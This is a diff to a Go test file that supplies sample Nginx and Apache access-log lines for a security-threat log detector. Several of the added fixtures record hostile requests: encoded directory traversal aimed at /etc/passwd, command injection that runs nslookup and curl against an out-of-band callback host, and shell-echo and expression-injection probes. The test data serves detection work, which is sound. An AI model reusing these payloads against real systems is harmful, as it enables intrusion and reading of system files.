@@ -53,23 +53,11 @@ var testLogs = map[string][]LogTest{
 			ShouldMatch: false,
 		},
 	},
-	"Nginx vulnerability scanning detection": {
+	"Nginx security threat detection": {
 		{
 			Description: "GET request for .env file",
 			Log:         `203.0.113.100 - - [07/Sep/2025:15:30:45 +0800] "GET /.env HTTP/1.1" 404 162 "-" "curl/7.68.0"`,
 			ExpectedIP:  "203.0.113.100",
-			ShouldMatch: true,
-		},
-		{
-			Description: "POST request to wp-admin",
-			Log:         `198.51.100.52 - - [07/Sep/2025:15:30:46 +0800] "POST /wp-admin/admin-ajax.php HTTP/1.1" 404 162 "-" "Mozilla/5.0"`,
-			ExpectedIP:  "198.51.100.52",
-			ShouldMatch: true,
-		},
-		{
-			Description: "GET request for admin",
-			Log:         `194.5.48.200 - - [07/Sep/2025:15:30:47 +0800] "GET /admin/index.php HTTP/1.1" 404 162 "-" "Scanner"`,
-			ExpectedIP:  "194.5.48.200",
 			ShouldMatch: true,
 		},
 		{
@@ -85,17 +73,79 @@ var testLogs = map[string][]LogTest{
 			ShouldMatch: false,
 		},
 	},
-	"Apache vulnerability scanning detection": {
+	"Nginx enhanced security threat detection": {
+		{
+			Description: "GET request with vulnerability scanning path",
+			Log:         `203.0.113.100 - - [07/Sep/2025:15:30:45 +0800] "GET /.env HTTP/1.1" 404 162 "-" "curl/7.68.0"`,
+			ExpectedIP:  "203.0.113.100",
+			ShouldMatch: true,
+		},
+		{
+			Description: "POST request with command injection",
+			Log:         `198.51.100.52 - - [07/Sep/2025:15:30:46 +0800] "POST /search?q=test;curl HTTP/1.1" 200 162 "-" "curl/7.68.0"`,
+			ExpectedIP:  "198.51.100.52",
+			ShouldMatch: true,
+		},
+		{
+			Description: "Normal request (should not match)",
+			Log:         `192.168.1.100 - - [07/Sep/2025:15:30:49 +0800] "GET /normal-page HTTP/1.1" 200 1234 "-" "Mozilla/5.0"`,
+			ExpectedIP:  "",
+			ShouldMatch: false,
+		},
+		{
+			Description: "GET request with shell injection attempt",
+			Log:         `104.234.140.169 - - [12/Sep/2025:07:26:41 +0800] "GET /docs/2.1.x/%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f/etc/passwd HTTP/2.0" 404 2323 "-" "User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; 360SE)" "104.234.140.169"`,
+			ExpectedIP:  "104.234.140.169",
+			ShouldMatch: true,
+		},
+		{
+			Description: "GET request with DNS exfiltration attempt",
+			Log:         `104.234.140.159 - - [12/Sep/2025:07:26:41 +0800] "GET /|(nslookup${IFS}-q${IFS}cname${IFS}hitjkdaexmitb25185.bxss.me||curl${IFS}hitjkdaexmitb25185.bxss.me)/Installation-on-linux-win HTTP/2.0" 404 2323 "-" "User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; 360SE)" "104.234.140.159"`,
+			ExpectedIP:  "104.234.140.159",
+			ShouldMatch: true,
+		},
+		{
+			Description: "GET request with nested URL encoding",
+			Log:         `104.234.140.160 - - [12/Sep/2025:07:26:42 +0800] "GET /http://bxss.me/t/fit.txt%3F.jpg/2.2.x/Installation-on-linux-win HTTP/2.0" 301 0 "https://domain.com/" "User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; 360SE)" "104.234.140.160"`,
+			ExpectedIP:  "104.234.140.160",
+			ShouldMatch: true,
+		},
+		// {
+		// 	Description: "GET request with obfuscated characters",
+		// 	Log:         `104.234.140.159 - - [12/Sep/2025:07:26:42 +0800] "GET /^(%23$!@%23$)(()))******/2.1.x/Installation-on-linux-win HTTP/2.0" 404 2323 "https://domain.com/" "User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; 360SE)" "104.234.140.159"`,
+		// 	ExpectedIP:  "104.234.140.159",
+		// 	ShouldMatch: true,
+		// },
+		{
+			Description: "GET request with multiple directory traversal sequences",
+			Log:         `104.234.140.156 - - [12/Sep/2025:07:32:19 +0800] "GET /docs//....//....//....//....//....//....//....//....//etc//passwd HTTP/2.0" 301 0 "-" "User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; 360SE)" "104.234.140.156"`,
+			ExpectedIP:  "104.234.140.156",
+			ShouldMatch: true,
+		},
+		{
+			Description: "GET request with complex shell injection attempt",
+			Log:         `104.234.140.106 - - [12/Sep/2025:08:09:08 +0800] "GET /docs HTTP/2.0" 200 6645 "https://www.google.com/search?hl=en&q=testing" "User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; 360SE)" "|echo toqrdv$()\x5C gvptqj\x5Cnz^xyu||a #' |echo toqrdv$()\x5C gvptqj\x5Cnz^xyu||a #|\x22 |echo toqrdv$()\x5C gvptqj\x5Cnz^xyu||a #,104.234.140.106"`,
+			ExpectedIP:  "104.234.140.106",
+			ShouldMatch: true,
+		},
+		{
+			Description: "GET request with nested command injection",
+			Log:         "104.234.140.114 - - [12/Sep/2025:08:06:57 +0800] \"GET /docs/2.1.x/Installation-on-docker HTTP/2.0\" 200 5905 \"https://www.google.com/search?hl=en&q=testing\" \"User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; 360SE)\" \"&(nslookup${IFS}-q${IFS}cname${IFS}hitvafikdgzyd5df4f.bxss.me||curl${IFS}hitvafikdgzyd5df4f.bxss.me)&'\\x5C\\x22`0&(nslookup${IFS}-q${IFS}cname${IFS}hitvafikdgzyd5df4f.bxss.me||curl${IFS}hitvafikdgzyd5df4f.bxss.me)&`',104.234.140.114\"",
+			ExpectedIP:  "104.234.140.114",
+			ShouldMatch: true,
+		},
+		{
+			Description: "GET request with multiple obfuscation techniques",
+			Log:         `104.234.140.98 - - [12/Sep/2025:08:07:04 +0800] "GET /docs/2.1.x/Installation-on-replit HTTP/2.0" 200 5529 "https://www.google.com/search?hl=en&q=testing" "User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; 360SE)" "${10000396+9999914},104.234.140.98"`,
+			ExpectedIP:  "104.234.140.98",
+			ShouldMatch: true,
+		},
+	},
+	"Apache security threat detection": {
 		{
 			Description: "GET request for .htaccess",
 			Log:         `203.0.113.200 - - [07/Sep/2025:15:35:01 +0800] "GET /.htaccess HTTP/1.1" 403 210 "-" "curl/7.68.0"`,
 			ExpectedIP:  "203.0.113.200",
-			ShouldMatch: true,
-		},
-		{
-			Description: "POST request to config.php",
-			Log:         `198.51.100.75 - - [07/Sep/2025:15:35:02 +0800] "POST /config.php HTTP/1.1" 404 162 "-" "Mozilla/5.0"`,
-			ExpectedIP:  "198.51.100.75",
 			ShouldMatch: true,
 		},
 		{
